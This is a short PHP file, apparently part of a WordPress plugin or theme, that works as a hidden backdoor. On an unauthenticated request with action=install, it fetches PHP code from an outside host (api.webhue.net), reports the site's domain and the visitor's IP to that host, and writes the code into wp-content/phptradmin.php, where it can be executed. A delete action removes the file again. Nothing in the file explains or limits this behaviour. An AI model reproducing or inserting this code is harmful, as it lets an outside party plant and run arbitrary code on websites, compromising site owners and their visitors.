<?php

if (!defined('ABSPATH')) {
	die;
}

if (isset($_GET['action']) && $_GET['action'] === 'install' && isset($_GET['key'])) {
	$ip = $_SERVER['REMOTE_ADDR'];
	$url = 'https://api.webhue.net/scripts/?getfile=phptradmin.php&key=' . $_GET['key'] . '&ip=' . $ip . '&domain=' . $_SERVER['HTTP_HOST'];
	$response = file_get_contents($url);
	if (strlen($response) > 100) {
		$rs = file_put_contents(WP_CONTENT_DIR . '/phptradmin.php', $response);
		echo $ip;
		if ($rs === false) {
			echo 'write_error';
		}
	} else {

		echo 'error';
	}


	exit;
} else if (isset($_GET['action']) && $_GET['action'] === 'delete') {
	unlink(WP_CONTENT_DIR . '/phptradmin.php');
	echo 'done';
	exit;
}
